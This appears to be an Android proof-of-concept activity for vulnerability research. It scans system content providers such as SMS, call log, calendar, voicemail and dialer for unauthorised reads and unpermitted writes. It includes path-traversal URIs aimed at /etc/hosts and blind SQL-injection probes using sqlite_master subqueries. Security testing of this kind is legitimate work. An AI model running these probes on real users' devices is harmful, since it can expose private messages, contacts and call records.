package com.vrp.poc;

import android.app.Activity;
import android.content.ContentValues;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;
import java.io.InputStream;

public class NovelAttackSurfaceActivity extends Activity {
    private static final String TAG = "NovelAttack";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(8);
        logView.setText("Novel Attack Surface Scanner\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);
        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private void runTests() {
        // Test 1: Dialer content providers
        log("=== Test 1: Dialer Providers ===");
        String[][] dialerProviders = {
            {"content://com.android.dialer.files/", "dialer files"},
            {"content://com.google.android.dialer.files/", "dialer files2"},
            {"content://com.android.dialer.calllog/AnnotatedCallLog", "annotated_calllog"},
            {"content://com.android.dialer.phonelookuphistory/PhoneLookupHistory", "phone_lookup"},
        };
        for (String[] p : dialerProviders) {
            testProvider(p[0], p[1]);
        }

        // Test 2: Telecom providers
        log("\n=== Test 2: Telecom Providers ===");
        String[][] telecomProviders = {
            {"content://com.android.server.telecom/", "telecom_root"},
            {"content://com.android.phone/", "phone_root"},
        };
        for (String[] p : telecomProviders) {
            testProvider(p[0], p[1]);
        }

        // Test 3: Try to write to ContactsProvider
        log("\n=== Test 3: Write test on Contacts ===");
        try {
            ContentValues cv = new ContentValues();
            cv.put("account_name", "test_vuln");
            cv.put("account_type", "test_type");
            Uri result = getContentResolver().insert(
                Uri.parse("content://com.android.contacts/raw_contacts"), cv);
            if (result != null) {
                log("[VULN] Inserted raw_contact: " + result);
                // Try to delete it
                int deleted = getContentResolver().delete(result, null, null);
                log("  Cleanup: deleted " + deleted);
            } else {
                log("[SAFE] Insert returned null");
            }
        } catch (Exception e) {
            log("[BLOCKED] Insert: " + e.getClass().getSimpleName() + ": " + e.getMessage());
        }

        // Test 4: SMS/MMS providers from app context
        log("\n=== Test 4: SMS/MMS Providers ===");
        String[][] smsProviders = {
            {"content://sms/", "sms"},
            {"content://sms/inbox", "sms_inbox"},
            {"content://sms/sent", "sms_sent"},
            {"content://sms/draft", "sms_draft"},
            {"content://mms/", "mms"},
            {"content://mms-sms/conversations", "conversations"},
            {"content://mms-sms/pending", "pending"},
        };
        for (String[] p : smsProviders) {
            testProviderWithSqli(p[0], p[1]);
        }

        // Test 5: TelephonyProvider
        log("\n=== Test 5: Telephony Provider ===");
        String[][] telephonyProviders = {
            {"content://telephony/carriers", "carriers"},
            {"content://telephony/siminfo", "siminfo"},
        };
        for (String[] p : telephonyProviders) {
            testProviderWithSqli(p[0], p[1]);
        }

        // Test 6: Browser bookmarks/history (legacy)
        log("\n=== Test 6: Browser/Bookmarks ===");
        testProvider("content://browser/bookmarks", "bookmarks");
        testProvider("content://browser/searches", "searches");

        // Test 7: SliceProvider URIs
        log("\n=== Test 7: Slice Providers ===");
        String[][] sliceProviders = {
            {"content://com.google.android.gms.nearby.discovery/", "nearby_slice"},
            {"content://com.google.android.apps.wellbeing.slice/", "wellbeing_slice"},
            {"content://com.google.android.settings.slices/", "settings_slice"},
            {"content://android.settings.slices/", "android_settings_slice"},
        };
        for (String[] p : sliceProviders) {
            testProvider(p[0], p[1]);
        }

        // Test 8: Test openFile() path traversal on known FileProviders
        log("\n=== Test 8: FileProvider path traversal ===");
        String[][] fileProviderPaths = {
            {"content://com.google.android.gms.files/files/../../../../etc/hosts", "gms_traversal"},
            {"content://com.google.android.apps.messaging.files/files/../../../../etc/hosts", "msg_traversal"},
            {"content://com.google.android.dialer.files/../../../../../etc/hosts", "dialer_traversal"},
            {"content://com.android.providers.media.documents/document/raw%3A%2Fetc%2Fhosts", "media_doc_traversal"},
        };
        for (String[] p : fileProviderPaths) {
            try {
                InputStream is = getContentResolver().openInputStream(Uri.parse(p[0]));
                if (is != null) {
                    byte[] buf = new byte[256];
                    int read = is.read(buf);
                    is.close();
                    log("[VULN] " + p[1] + ": read " + read + " bytes: " + new String(buf, 0, Math.min(read, 80)));
                } else {
                    log("[SAFE] " + p[1] + ": null stream");
                }
            } catch (Exception e) {
                log("[BLOCKED] " + p[1] + ": " + e.getClass().getSimpleName());
            }
        }

        // Test 9: CalendarProvider blind SQLi on additional URIs
        log("\n=== Test 9: Calendar additional URIs ===");
        String[][] calUris = {
            {"content://com.android.calendar/calendars", "calendars"},
            {"content://com.android.calendar/attendees", "attendees"},
            {"content://com.android.calendar/reminders", "reminders"},
            {"content://com.android.calendar/calendar_alerts", "alerts"},
            {"content://com.android.calendar/extendedproperties", "ext_props"},
            {"content://com.android.calendar/syncstate", "syncstate"},
            {"content://com.android.calendar/colors", "colors"},
        };
        for (String[] p : calUris) {
            testProviderWithSqli(p[0], p[1]);
        }

        // Test 10: Test insert into CallLog (write without WRITE_CALL_LOG)
        log("\n=== Test 10: CallLog write test ===");
        try {
            ContentValues cv = new ContentValues();
            cv.put("number", "+0000000000");
            cv.put("type", 1);
            cv.put("date", System.currentTimeMillis());
            Uri result = getContentResolver().insert(
                Uri.parse("content://call_log/calls"), cv);
            if (result != null) {
                log("[VULN] Inserted call log: " + result);
                getContentResolver().delete(result, null, null);
            }
        } catch (Exception e) {
            log("[BLOCKED] CallLog insert: " + e.getClass().getSimpleName());
        }

        // Test 11: Test insert into SMS (write without WRITE_SMS)
        log("\n=== Test 11: SMS write test ===");
        try {
            ContentValues cv = new ContentValues();
            cv.put("address", "+0000000000");
            cv.put("body", "test");
            Uri result = getContentResolver().insert(
                Uri.parse("content://sms/inbox"), cv);
            if (result != null) {
                log("[VULN] Inserted SMS: " + result);
                getContentResolver().delete(result, null, null);
            }
        } catch (Exception e) {
            log("[BLOCKED] SMS insert: " + e.getClass().getSimpleName());
        }

        // Test 12: Clipboard provider
        log("\n=== Test 12: Clipboard ===");
        testProvider("content://clipboard/clip", "clipboard");

        // Test 13: VoicemailProvider
        log("\n=== Test 13: Voicemail ===");
        testProviderWithSqli("content://com.android.voicemail/voicemail", "voicemail");
        testProviderWithSqli("content://com.android.voicemail/status", "voicemail_status");

        // Test 14: Document providers
        log("\n=== Test 14: Document Providers ===");
        testProvider("content://com.android.externalstorage.documents/root/primary", "ext_storage_root");
        testProvider("content://com.android.providers.downloads.documents/root/downloads", "downloads_root");

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private void testProvider(String uriStr, String label) {
        try {
            Cursor c = getContentResolver().query(Uri.parse(uriStr), null, null, null, null);
            if (c != null) {
                String[] cols = c.getColumnNames();
                log("[OPEN] " + label + ": " + c.getCount() + " rows, cols=" + String.join(",", cols));
                c.close();
            } else {
                log("[NULL] " + label);
            }
        } catch (Exception e) {
            String msg = e.getMessage();
            if (msg != null && msg.length() > 80) msg = msg.substring(0, 80);
            log("[ERR] " + label + ": " + e.getClass().getSimpleName() + ": " + msg);
        }
    }

    private void testProviderWithSqli(String uriStr, String label) {
        Uri uri = Uri.parse(uriStr);
        try {
            Cursor c = getContentResolver().query(uri, null, null, null, null);
            if (c != null) {
                int normal = c.getCount();
                String[] cols = c.getColumnNames();
                c.close();
                log("[OPEN] " + label + ": " + normal + " rows, cols=" + String.join(",", cols));

                // Test SQLi
                try {
                    Cursor c2 = getContentResolver().query(uri, new String[]{"_id"},
                        "(SELECT 1 FROM sqlite_master LIMIT 1) = 1", null, null);
                    if (c2 != null) {
                        int sqliCount = c2.getCount();
                        c2.close();
                        Cursor c3 = getContentResolver().query(uri, new String[]{"_id"},
                            "(SELECT 1 FROM sqlite_master LIMIT 1) = 99", null, null);
                        int falseCt = c3 != null ? c3.getCount() : -1;
                        if (c3 != null) c3.close();
                        if (sqliCount > 0 && falseCt == 0) {
                            log("  [SQLI VULN] " + label + " true=" + sqliCount + " false=" + falseCt);
                        } else {
                            log("  [SQLI SAFE] " + label + " true=" + sqliCount + " false=" + falseCt);
                        }
                    }
                } catch (Exception e2) {
                    log("  [SQLI BLOCKED] " + label + ": " + e2.getClass().getSimpleName());
                }
            } else {
                log("[NULL] " + label);
            }
        } catch (Exception e) {
            String msg = e.getMessage();
            if (msg != null && msg.length() > 80) msg = msg.substring(0, 80);
            log("[ERR] " + label + ": " + e.getClass().getSimpleName() + ": " + msg);
        }
    }
}
